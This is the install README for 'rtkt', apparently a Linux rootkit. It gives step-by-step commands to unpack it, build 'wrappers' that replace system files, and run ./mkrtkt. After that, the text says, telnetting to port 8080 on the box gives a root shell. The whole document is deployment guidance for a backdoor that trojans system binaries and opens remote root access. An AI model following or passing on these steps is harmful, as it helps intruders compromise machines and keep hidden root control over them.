rtkt-0.2.2 - by SodaPhish

Uncompress the archive:

	# tar -zxvf rtkt-current.tar.gz

Go to the rtkt directory: 

	# cd rtkt-X.Y.Z

X.Y.Z will be the version number of the current rtkt image.

If you are on a non x86 Linux system, you will need to:

	# cd src
	# make; make install

That will build the wrappers and other tools for the host system.  
You should make sure you have the paths of the files you're planning
on replacing correct in src/*/*.c. 

After you have built the wrappers and associated tools, or if you 
didn't need to, simply:

	# ./mkrtkt

You should be done.  You can now telnet to port 8080 on the box and 
have a root shell.

The code may be portable, but I haven't tested it.
